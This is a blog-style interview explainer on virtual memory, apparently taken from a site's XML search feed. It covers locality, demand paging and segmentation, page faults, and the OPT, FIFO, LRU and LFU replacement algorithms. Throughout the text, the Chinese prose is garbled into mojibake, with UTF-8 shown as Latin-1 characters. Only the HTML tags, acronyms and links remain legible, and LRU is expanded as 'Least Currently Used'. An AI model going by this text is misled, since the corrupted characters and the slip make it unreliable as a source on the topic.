<p><strong>è™šæ‹Ÿå†…å­˜</strong>æ˜¯è®¡ç®—æœºç³»ç»Ÿå†…å­˜ç®¡ç†çš„ä¸€ç§æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨è®¾ç½®è‡ªå·±ç”µè„‘çš„è™šæ‹Ÿå†…å­˜ã€‚ä¸è¦å•çº¯è®¤ä¸ºè™šæ‹Ÿå†…å­˜åªæ˜¯â€œä½¿ç”¨ç¡¬ç›˜ç©ºé—´æ¥æ‰©å±•å†…å­˜â€œçš„æŠ€æœ¯ã€‚<strong>è™šæ‹Ÿå†…å­˜çš„é‡è¦æ„ä¹‰æ˜¯å®ƒå®šä¹‰äº†ä¸€ä¸ªè¿ç»­çš„è™šæ‹Ÿåœ°å€ç©ºé—´</strong>ï¼Œå¹¶ä¸” <strong>æŠŠå†…å­˜æ‰©å±•åˆ°ç¡¬ç›˜ç©ºé—´</strong>ã€‚æ¨èé˜…è¯»ï¼š<a href="https://juejin.im/post/59f8691b51882534af254317">ã€Šè™šæ‹Ÿå†…å­˜çš„é‚£ç‚¹äº‹å„¿ã€‹</a></p>
<p>ç»´åŸºç™¾ç§‘ä¸­æœ‰å‡ å¥è¯æ˜¯è¿™æ ·ä»‹ç»è™šæ‹Ÿå†…å­˜çš„ã€‚</p>
<blockquote>
<p><strong>è™šæ‹Ÿå†…å­˜</strong> ä½¿å¾—åº”ç”¨ç¨‹åºè®¤ä¸ºå®ƒæ‹¥æœ‰è¿ç»­çš„å¯ç”¨çš„å†…å­˜ï¼ˆä¸€ä¸ªè¿ç»­å®Œæ•´çš„åœ°å€ç©ºé—´ï¼‰ï¼Œè€Œå®é™…ä¸Šï¼Œå®ƒé€šå¸¸æ˜¯è¢«åˆ†éš”æˆå¤šä¸ªç‰©ç†å†…å­˜ç¢ç‰‡ï¼Œè¿˜æœ‰éƒ¨åˆ†æš‚æ—¶å­˜å‚¨åœ¨å¤–éƒ¨ç£ç›˜å­˜å‚¨å™¨ä¸Šï¼Œåœ¨éœ€è¦æ—¶è¿›è¡Œæ•°æ®äº¤æ¢ã€‚ä¸æ²¡æœ‰ä½¿ç”¨è™šæ‹Ÿå†…å­˜æŠ€æœ¯çš„ç³»ç»Ÿç›¸æ¯”ï¼Œä½¿ç”¨è¿™ç§æŠ€æœ¯çš„ç³»ç»Ÿä½¿å¾—å¤§å‹ç¨‹åºçš„ç¼–å†™å˜å¾—æ›´å®¹æ˜“ï¼Œå¯¹çœŸæ­£çš„ç‰©ç†å†…å­˜ï¼ˆä¾‹å¦‚ RAMï¼‰çš„ä½¿ç”¨ä¹Ÿæ›´æœ‰æ•ˆç‡ã€‚ç›®å‰ï¼Œå¤§å¤šæ•°æ“ä½œç³»ç»Ÿéƒ½ä½¿ç”¨äº†è™šæ‹Ÿå†…å­˜ï¼Œå¦‚ Windows å®¶æ—çš„â€œè™šæ‹Ÿå†…å­˜â€ï¼›Linux çš„â€œäº¤æ¢ç©ºé—´â€ç­‰ã€‚From:<a href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98">https://zh.wikipedia.org/wiki/è™šæ‹Ÿå†…å­˜</a></p>
</blockquote>
<h3 id="å±€éƒ¨æ€§åŸç†"><a href="#å±€éƒ¨æ€§åŸç†" class="headerlink" title="å±€éƒ¨æ€§åŸç†"></a>å±€éƒ¨æ€§åŸç†</h3><p>ğŸ‘¨â€ğŸ’»<strong>é¢è¯•å®˜</strong> ï¼šè¦æƒ³æ›´å¥½åœ°ç†è§£è™šæ‹Ÿå†…å­˜æŠ€æœ¯ï¼Œå¿…é¡»è¦çŸ¥é“è®¡ç®—æœºä¸­è‘—åçš„<strong>å±€éƒ¨æ€§åŸç†</strong>ã€‚å¦å¤–ï¼Œå±€éƒ¨æ€§åŸç†æ—¢é€‚ç”¨äºç¨‹åºç»“æ„ï¼Œä¹Ÿé€‚ç”¨äºæ•°æ®ç»“æ„ï¼Œæ˜¯éå¸¸é‡è¦çš„ä¸€ä¸ªæ¦‚å¿µã€‚</p>
<p>ğŸ™‹ <strong>æˆ‘</strong> ï¼šå±€éƒ¨æ€§åŸç†æ˜¯è™šæ‹Ÿå†…å­˜æŠ€æœ¯çš„åŸºç¡€ï¼Œæ­£æ˜¯å› ä¸ºç¨‹åºè¿è¡Œå…·æœ‰å±€éƒ¨æ€§åŸç†ï¼Œæ‰å¯ä»¥åªè£…å…¥éƒ¨åˆ†ç¨‹åºåˆ°å†…å­˜å°±å¼€å§‹è¿è¡Œã€‚</p>
<p>å±€éƒ¨æ€§åŸç†è¡¨ç°åœ¨ä»¥ä¸‹ä¸¤ä¸ªæ–¹é¢ï¼š</p>
<ol>
<li><strong>æ—¶é—´å±€éƒ¨æ€§</strong> ï¼šå¦‚æœç¨‹åºä¸­çš„æŸæ¡æŒ‡ä»¤ä¸€æ—¦æ‰§è¡Œï¼Œä¸ä¹…ä»¥åè¯¥æŒ‡ä»¤å¯èƒ½å†æ¬¡æ‰§è¡Œï¼›å¦‚æœæŸæ•°æ®è¢«è®¿é—®è¿‡ï¼Œä¸ä¹…ä»¥åè¯¥æ•°æ®å¯èƒ½å†æ¬¡è¢«è®¿é—®ã€‚äº§ç”Ÿæ—¶é—´å±€éƒ¨æ€§çš„å…¸å‹åŸå› ï¼Œæ˜¯ç”±äºåœ¨ç¨‹åºä¸­å­˜åœ¨ç€å¤§é‡çš„å¾ªç¯æ“ä½œã€‚</li>
<li><strong>ç©ºé—´å±€éƒ¨æ€§</strong> ï¼šä¸€æ—¦ç¨‹åºè®¿é—®äº†æŸä¸ªå­˜å‚¨å•å…ƒï¼Œåœ¨ä¸ä¹…ä¹‹åï¼Œå…¶é™„è¿‘çš„å­˜å‚¨å•å…ƒä¹Ÿå°†è¢«è®¿é—®ï¼Œå³ç¨‹åºåœ¨ä¸€æ®µæ—¶é—´å†…æ‰€è®¿é—®çš„åœ°å€ï¼Œå¯èƒ½é›†ä¸­åœ¨ä¸€å®šçš„èŒƒå›´ä¹‹å†…ï¼Œè¿™æ˜¯å› ä¸ºæŒ‡ä»¤é€šå¸¸æ˜¯é¡ºåºå­˜æ”¾ã€é¡ºåºæ‰§è¡Œçš„ï¼Œæ•°æ®ä¹Ÿä¸€èˆ¬æ˜¯ä»¥å‘é‡ã€æ•°ç»„ã€è¡¨ç­‰å½¢å¼ç°‡èšå­˜å‚¨çš„ã€‚</li>
</ol>
<p>æ—¶é—´å±€éƒ¨æ€§æ˜¯é€šè¿‡å°†è¿‘æ¥ä½¿ç”¨çš„æŒ‡ä»¤å’Œæ•°æ®ä¿å­˜åˆ°é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ä¸­ï¼Œå¹¶ä½¿ç”¨é«˜é€Ÿç¼“å­˜çš„å±‚æ¬¡ç»“æ„å®ç°ã€‚ç©ºé—´å±€éƒ¨æ€§é€šå¸¸æ˜¯ä½¿ç”¨è¾ƒå¤§çš„é«˜é€Ÿç¼“å­˜ï¼Œå¹¶å°†é¢„å–æœºåˆ¶é›†æˆåˆ°é«˜é€Ÿç¼“å­˜æ§åˆ¶é€»è¾‘ä¸­å®ç°ã€‚è™šæ‹Ÿå†…å­˜æŠ€æœ¯å®é™…ä¸Šå°±æ˜¯å»ºç«‹äº† â€œå†…å­˜ä¸€å¤–å­˜â€çš„ä¸¤çº§å­˜å‚¨å™¨çš„ç»“æ„ï¼Œåˆ©ç”¨å±€éƒ¨æ€§åŸç†å®ç°é«™é€Ÿç¼“å­˜ã€‚</p>
<h3 id="è™šæ‹Ÿå­˜å‚¨å™¨"><a href="#è™šæ‹Ÿå­˜å‚¨å™¨" class="headerlink" title="è™šæ‹Ÿå­˜å‚¨å™¨"></a>è™šæ‹Ÿå­˜å‚¨å™¨</h3><blockquote>
<p><strong>å‹˜è¯¯ï¼šè™šæ‹Ÿå­˜å‚¨å™¨åˆå«åšè™šæ‹Ÿå†…å­˜ï¼Œéƒ½æ˜¯ Virtual Memory çš„ç¿»è¯‘ï¼Œå±äºåŒä¸€ä¸ªæ¦‚å¿µã€‚</strong></p>
</blockquote>
<p>åŸºäºå±€éƒ¨æ€§åŸç†ï¼Œåœ¨ç¨‹åºè£…å…¥æ—¶ï¼Œå¯ä»¥å°†ç¨‹åºçš„ä¸€éƒ¨åˆ†è£…å…¥å†…å­˜ï¼Œè€Œå°†å…¶ä»–éƒ¨åˆ†ç•™åœ¨å¤–å­˜ï¼Œå°±å¯ä»¥å¯åŠ¨ç¨‹åºæ‰§è¡Œã€‚ç”±äºå¤–å­˜å¾€å¾€æ¯”å†…å­˜å¤§å¾ˆå¤šï¼Œæ‰€ä»¥æˆ‘ä»¬è¿è¡Œçš„è½¯ä»¶çš„å†…å­˜å¤§å°å®é™…ä¸Šæ˜¯å¯ä»¥æ¯”è®¡ç®—æœºç³»ç»Ÿå®é™…çš„å†…å­˜å¤§å°å¤§çš„ã€‚åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå½“æ‰€è®¿é—®çš„ä¿¡æ¯ä¸åœ¨å†…å­˜æ—¶ï¼Œç”±æ“ä½œç³»ç»Ÿå°†æ‰€éœ€è¦çš„éƒ¨åˆ†è°ƒå…¥å†…å­˜ï¼Œç„¶åç»§ç»­æ‰§è¡Œç¨‹åºã€‚å¦ä¸€æ–¹é¢ï¼Œæ“ä½œç³»ç»Ÿå°†å†…å­˜ä¸­æš‚æ—¶ä¸ä½¿ç”¨çš„å†…å®¹æ¢åˆ°å¤–å­˜ä¸Šï¼Œä»è€Œè…¾å‡ºç©ºé—´å­˜æ”¾å°†è¦è°ƒå…¥å†…å­˜çš„ä¿¡æ¯ã€‚è¿™æ ·ï¼Œè®¡ç®—æœºå¥½åƒä¸ºç”¨æˆ·æä¾›äº†ä¸€ä¸ªæ¯”å®é™…å†…å­˜å¤§çš„å¤šçš„å­˜å‚¨å™¨â€”â€”<strong>è™šæ‹Ÿå­˜å‚¨å™¨</strong>ã€‚</p>
<p>å®é™…ä¸Šï¼Œæˆ‘è§‰å¾—è™šæ‹Ÿå†…å­˜åŒæ ·æ˜¯ä¸€ç§æ—¶é—´æ¢ç©ºé—´çš„ç­–ç•¥ï¼Œä½ ç”¨ CPU çš„è®¡ç®—æ—¶é—´ï¼Œé¡µçš„è°ƒå…¥è°ƒå‡ºèŠ±è´¹çš„æ—¶é—´ï¼Œæ¢æ¥äº†ä¸€ä¸ªè™šæ‹Ÿçš„æ›´å¤§çš„ç©ºé—´æ¥æ”¯æŒç¨‹åºçš„è¿è¡Œã€‚ä¸å¾—ä¸æ„Ÿå¹ï¼Œç¨‹åºä¸–ç•Œå‡ ä¹ä¸æ˜¯æ—¶é—´æ¢ç©ºé—´å°±æ˜¯ç©ºé—´æ¢æ—¶é—´ã€‚</p>
<h3 id="è™šæ‹Ÿå†…å­˜çš„æŠ€æœ¯å®ç°"><a href="#è™šæ‹Ÿå†…å­˜çš„æŠ€æœ¯å®ç°" class="headerlink" title="è™šæ‹Ÿå†…å­˜çš„æŠ€æœ¯å®ç°"></a>è™šæ‹Ÿå†…å­˜çš„æŠ€æœ¯å®ç°</h3><p>ğŸ‘¨â€ğŸ’»<strong>é¢è¯•å®˜</strong> ï¼š<strong>è™šæ‹Ÿå†…å­˜æŠ€æœ¯çš„å®ç°å‘¢ï¼Ÿ</strong></p>
<p>ğŸ™‹ <strong>æˆ‘</strong> ï¼š<strong>è™šæ‹Ÿå†…å­˜çš„å®ç°éœ€è¦å»ºç«‹åœ¨ç¦»æ•£åˆ†é…çš„å†…å­˜ç®¡ç†æ–¹å¼çš„åŸºç¡€ä¸Šã€‚</strong> è™šæ‹Ÿå†…å­˜çš„å®ç°æœ‰ä»¥ä¸‹ä¸‰ç§æ–¹å¼ï¼š</p>
<ol>
<li><strong>è¯·æ±‚åˆ†é¡µå­˜å‚¨ç®¡ç†</strong> ï¼šå»ºç«‹åœ¨åˆ†é¡µç®¡ç†ä¹‹ä¸Šï¼Œä¸ºäº†æ”¯æŒè™šæ‹Ÿå­˜å‚¨å™¨åŠŸèƒ½è€Œå¢åŠ äº†è¯·æ±‚è°ƒé¡µåŠŸèƒ½å’Œé¡µé¢ç½®æ¢åŠŸèƒ½ã€‚è¯·æ±‚åˆ†é¡µæ˜¯ç›®å‰æœ€å¸¸ç”¨çš„ä¸€ç§å®ç°è™šæ‹Ÿå­˜å‚¨å™¨çš„æ–¹æ³•ã€‚è¯·æ±‚åˆ†é¡µå­˜å‚¨ç®¡ç†ç³»ç»Ÿä¸­ï¼Œåœ¨ä½œä¸šå¼€å§‹è¿è¡Œä¹‹å‰ï¼Œä»…è£…å…¥å½“å‰è¦æ‰§è¡Œçš„éƒ¨åˆ†æ®µå³å¯è¿è¡Œã€‚å‡å¦‚åœ¨ä½œä¸šè¿è¡Œçš„è¿‡ç¨‹ä¸­å‘ç°è¦è®¿é—®çš„é¡µé¢ä¸åœ¨å†…å­˜ï¼Œåˆ™ç”±å¤„ç†å™¨é€šçŸ¥æ“ä½œç³»ç»ŸæŒ‰ç…§å¯¹åº”çš„é¡µé¢ç½®æ¢ç®—æ³•å°†ç›¸åº”çš„é¡µé¢è°ƒå…¥åˆ°ä¸»å­˜ï¼ŒåŒæ—¶æ“ä½œç³»ç»Ÿä¹Ÿå¯ä»¥å°†æš‚æ—¶ä¸ç”¨çš„é¡µé¢ç½®æ¢åˆ°å¤–å­˜ä¸­ã€‚</li>
<li><strong>è¯·æ±‚åˆ†æ®µå­˜å‚¨ç®¡ç†</strong> ï¼šå»ºç«‹åœ¨åˆ†æ®µå­˜å‚¨ç®¡ç†ä¹‹ä¸Šï¼Œå¢åŠ äº†è¯·æ±‚è°ƒæ®µåŠŸèƒ½ã€åˆ†æ®µç½®æ¢åŠŸèƒ½ã€‚è¯·æ±‚åˆ†æ®µå‚¨å­˜ç®¡ç†æ–¹å¼å°±å¦‚åŒè¯·æ±‚åˆ†é¡µå‚¨å­˜ç®¡ç†æ–¹å¼ä¸€æ ·ï¼Œåœ¨ä½œä¸šå¼€å§‹è¿è¡Œä¹‹å‰ï¼Œä»…è£…å…¥å½“å‰è¦æ‰§è¡Œçš„éƒ¨åˆ†æ®µå³å¯è¿è¡Œï¼›åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå¯ä½¿ç”¨è¯·æ±‚è°ƒå…¥ä¸­æ–­åŠ¨æ€è£…å…¥è¦è®¿é—®ä½†åˆä¸åœ¨å†…å­˜çš„ç¨‹åºæ®µï¼›å½“å†…å­˜ç©ºé—´å·²æ»¡ï¼Œè€Œåˆéœ€è¦è£…å…¥æ–°çš„æ®µæ—¶ï¼Œæ ¹æ®ç½®æ¢åŠŸèƒ½é€‚å½“è°ƒå‡ºæŸä¸ªæ®µï¼Œä»¥ä¾¿è…¾å‡ºç©ºé—´è€Œè£…å…¥æ–°çš„æ®µã€‚</li>
<li><strong>è¯·æ±‚æ®µé¡µå¼å­˜å‚¨ç®¡ç†</strong></li>
</ol>
<p><strong>è¿™é‡Œå¤šè¯´ä¸€ä¸‹ï¼Ÿå¾ˆå¤šäººå®¹æ˜“ææ··è¯·æ±‚åˆ†é¡µä¸åˆ†é¡µå­˜å‚¨ç®¡ç†ï¼Œä¸¤è€…æœ‰ä½•ä¸åŒå‘¢ï¼Ÿ</strong></p>
<p>è¯·æ±‚åˆ†é¡µå­˜å‚¨ç®¡ç†å»ºç«‹åœ¨åˆ†é¡µç®¡ç†ä¹‹ä¸Šã€‚ä»–ä»¬çš„æ ¹æœ¬åŒºåˆ«æ˜¯æ˜¯å¦å°†ç¨‹åºå…¨éƒ¨æ‰€éœ€çš„å…¨éƒ¨åœ°å€ç©ºé—´éƒ½è£…å…¥ä¸»å­˜ï¼Œè¿™ä¹Ÿæ˜¯è¯·æ±‚åˆ†é¡µå­˜å‚¨ç®¡ç†å¯ä»¥æä¾›è™šæ‹Ÿå†…å­˜çš„åŸå› ï¼Œæˆ‘ä»¬åœ¨ä¸Šé¢å·²ç»åˆ†æè¿‡äº†ã€‚</p>
<p>å®ƒä»¬ä¹‹é—´çš„æ ¹æœ¬åŒºåˆ«åœ¨äºæ˜¯å¦å°†ä¸€ä½œä¸šçš„å…¨éƒ¨åœ°å€ç©ºé—´åŒæ—¶è£…å…¥ä¸»å­˜ã€‚è¯·æ±‚åˆ†é¡µå­˜å‚¨ç®¡ç†ä¸è¦æ±‚å°†ä½œä¸šå…¨éƒ¨åœ°å€ç©ºé—´åŒæ—¶è£…å…¥ä¸»å­˜ã€‚åŸºäºè¿™ä¸€ç‚¹ï¼Œè¯·æ±‚åˆ†é¡µå­˜å‚¨ç®¡ç†å¯ä»¥æä¾›è™šå­˜ï¼Œè€Œåˆ†é¡µå­˜å‚¨ç®¡ç†å´ä¸èƒ½æä¾›è™šå­˜ã€‚</p>
<p>ä¸ç®¡æ˜¯ä¸Šé¢é‚£ç§å®ç°æ–¹å¼ï¼Œæˆ‘ä»¬ä¸€èˆ¬éƒ½éœ€è¦ï¼š</p>
<ol>
<li>ä¸€å®šå®¹é‡çš„å†…å­˜å’Œå¤–å­˜ï¼šåœ¨è½½å…¥ç¨‹åºçš„æ—¶å€™ï¼Œåªéœ€è¦å°†ç¨‹åºçš„ä¸€éƒ¨åˆ†è£…å…¥å†…å­˜ï¼Œè€Œå°†å…¶ä»–éƒ¨åˆ†ç•™åœ¨å¤–å­˜ï¼Œç„¶åç¨‹åºå°±å¯ä»¥æ‰§è¡Œäº†ï¼›</li>
<li><strong>ç¼ºé¡µä¸­æ–­</strong>ï¼šå¦‚æœ<strong>éœ€æ‰§è¡Œçš„æŒ‡ä»¤æˆ–è®¿é—®çš„æ•°æ®å°šæœªåœ¨å†…å­˜</strong>ï¼ˆç§°ä¸ºç¼ºé¡µæˆ–ç¼ºæ®µï¼‰ï¼Œåˆ™ç”±å¤„ç†å™¨é€šçŸ¥æ“ä½œç³»ç»Ÿå°†ç›¸åº”çš„é¡µé¢æˆ–æ®µ<strong>è°ƒå…¥åˆ°å†…å­˜</strong>ï¼Œç„¶åç»§ç»­æ‰§è¡Œç¨‹åºï¼›</li>
<li><strong>è™šæ‹Ÿåœ°å€ç©ºé—´</strong> ï¼šé€»è¾‘åœ°å€åˆ°ç‰©ç†åœ°å€çš„å˜æ¢ã€‚</li>
</ol>
<h3 id="é¡µé¢ç½®æ¢ç®—æ³•"><a href="#é¡µé¢ç½®æ¢ç®—æ³•" class="headerlink" title="é¡µé¢ç½®æ¢ç®—æ³•"></a>é¡µé¢ç½®æ¢ç®—æ³•</h3><p>ğŸ‘¨â€ğŸ’»<strong>é¢è¯•å®˜</strong> ï¼šè™šæ‹Ÿå†…å­˜ç®¡ç†å¾ˆé‡è¦çš„ä¸€ä¸ªæ¦‚å¿µå°±æ˜¯é¡µé¢ç½®æ¢ç®—æ³•ã€‚é‚£ä½ è¯´ä¸€ä¸‹ <strong>é¡µé¢ç½®æ¢ç®—æ³•çš„ä½œç”¨?å¸¸è§çš„é¡µé¢ç½®æ¢ç®—æ³•æœ‰å“ªäº›?</strong></p>
<p>ğŸ™‹ <strong>æˆ‘</strong> ï¼š</p>
<p>åœ°å€æ˜ å°„è¿‡ç¨‹ä¸­ï¼Œè‹¥åœ¨é¡µé¢ä¸­å‘ç°æ‰€è¦è®¿é—®çš„é¡µé¢ä¸åœ¨å†…å­˜ä¸­ï¼Œåˆ™å‘ç”Ÿç¼ºé¡µä¸­æ–­ ã€‚</p>
<blockquote>
<p><strong>ç¼ºé¡µä¸­æ–­</strong> å°±æ˜¯è¦è®¿é—®çš„<strong>é¡µ</strong>ä¸åœ¨ä¸»å­˜ï¼Œéœ€è¦æ“ä½œç³»ç»Ÿå°†å…¶è°ƒå…¥ä¸»å­˜åå†è¿›è¡Œè®¿é—®ã€‚ åœ¨è¿™ä¸ªæ—¶å€™ï¼Œè¢«å†…å­˜æ˜ å°„çš„æ–‡ä»¶å®é™…ä¸Šæˆäº†ä¸€ä¸ªåˆ†é¡µäº¤æ¢æ–‡ä»¶ã€‚</p>
</blockquote>
<p>å½“å‘ç”Ÿç¼ºé¡µä¸­æ–­æ—¶ï¼Œå¦‚æœå½“å‰å†…å­˜ä¸­å¹¶æ²¡æœ‰ç©ºé—²çš„é¡µé¢ï¼Œæ“ä½œç³»ç»Ÿå°±å¿…é¡»åœ¨å†…å­˜é€‰æ‹©ä¸€ä¸ªé¡µé¢å°†å…¶ç§»å‡ºå†…å­˜ï¼Œä»¥ä¾¿ä¸ºå³å°†è°ƒå…¥çš„é¡µé¢è®©å‡ºç©ºé—´ã€‚ç”¨æ¥é€‰æ‹©æ·˜æ±°å“ªä¸€é¡µçš„è§„åˆ™å«åšé¡µé¢ç½®æ¢ç®—æ³•ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠé¡µé¢ç½®æ¢ç®—æ³•çœ‹æˆæ˜¯æ·˜æ±°é¡µé¢çš„è§„åˆ™ã€‚</p>
<ul>
<li><strong>OPT é¡µé¢ç½®æ¢ç®—æ³•ï¼ˆæœ€ä½³é¡µé¢ç½®æ¢ç®—æ³•ï¼‰</strong> ï¼šæœ€ä½³(Optimal, OPT)ç½®æ¢ç®—æ³•æ‰€é€‰æ‹©çš„è¢«æ·˜æ±°é¡µé¢å°†æ˜¯ä»¥åæ°¸ä¸ä½¿ç”¨çš„ï¼Œæˆ–è€…æ˜¯åœ¨æœ€é•¿æ—¶é—´å†…ä¸å†è¢«è®¿é—®çš„é¡µé¢,è¿™æ ·å¯ä»¥ä¿è¯è·å¾—æœ€ä½çš„ç¼ºé¡µç‡ã€‚ä½†ç”±äºäººä»¬ç›®å‰æ— æ³•é¢„çŸ¥è¿›ç¨‹åœ¨å†…å­˜ä¸‹çš„è‹¥åƒé¡µé¢ä¸­å“ªä¸ªæ˜¯æœªæ¥æœ€é•¿æ—¶é—´å†…ä¸å†è¢«è®¿é—®çš„ï¼Œå› è€Œè¯¥ç®—æ³•æ— æ³•å®ç°ã€‚ä¸€èˆ¬ä½œä¸ºè¡¡é‡å…¶ä»–ç½®æ¢ç®—æ³•çš„æ–¹æ³•ã€‚</li>
<li><strong>FIFOï¼ˆFirst In First Outï¼‰ é¡µé¢ç½®æ¢ç®—æ³•ï¼ˆå…ˆè¿›å…ˆå‡ºé¡µé¢ç½®æ¢ç®—æ³•ï¼‰</strong> : æ€»æ˜¯æ·˜æ±°æœ€å…ˆè¿›å…¥å†…å­˜çš„é¡µé¢ï¼Œå³é€‰æ‹©åœ¨å†…å­˜ä¸­é©»ç•™æ—¶é—´æœ€ä¹…çš„é¡µé¢è¿›è¡Œæ·˜æ±°ã€‚</li>
<li><strong>LRU ï¼ˆLeast Currently Usedï¼‰é¡µé¢ç½®æ¢ç®—æ³•ï¼ˆæœ€è¿‘æœ€ä¹…æœªä½¿ç”¨é¡µé¢ç½®æ¢ç®—æ³•ï¼‰</strong> ï¼šLRUç®—æ³•èµ‹äºˆæ¯ä¸ªé¡µé¢ä¸€ä¸ªè®¿é—®å­—æ®µï¼Œç”¨æ¥è®°å½•ä¸€ä¸ªé¡µé¢è‡ªä¸Šæ¬¡è¢«è®¿é—®ä»¥æ¥æ‰€ç»å†çš„æ—¶é—´ Tï¼Œå½“é¡»æ·˜æ±°ä¸€ä¸ªé¡µé¢æ—¶ï¼Œé€‰æ‹©ç°æœ‰é¡µé¢ä¸­å…¶ T å€¼æœ€å¤§çš„ï¼Œå³æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨çš„é¡µé¢äºˆä»¥æ·˜æ±°ã€‚</li>
<li><strong>LFU ï¼ˆLeast Frequently Usedï¼‰é¡µé¢ç½®æ¢ç®—æ³•ï¼ˆæœ€å°‘ä½¿ç”¨é¡µé¢ç½®æ¢ç®—æ³•ï¼‰</strong> : è¯¥ç½®æ¢ç®—æ³•é€‰æ‹©åœ¨ä¹‹å‰æ—¶æœŸä½¿ç”¨æœ€å°‘çš„é¡µé¢ä½œä¸ºæ·˜æ±°é¡µã€‚</li>
</ul>
]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
</search>
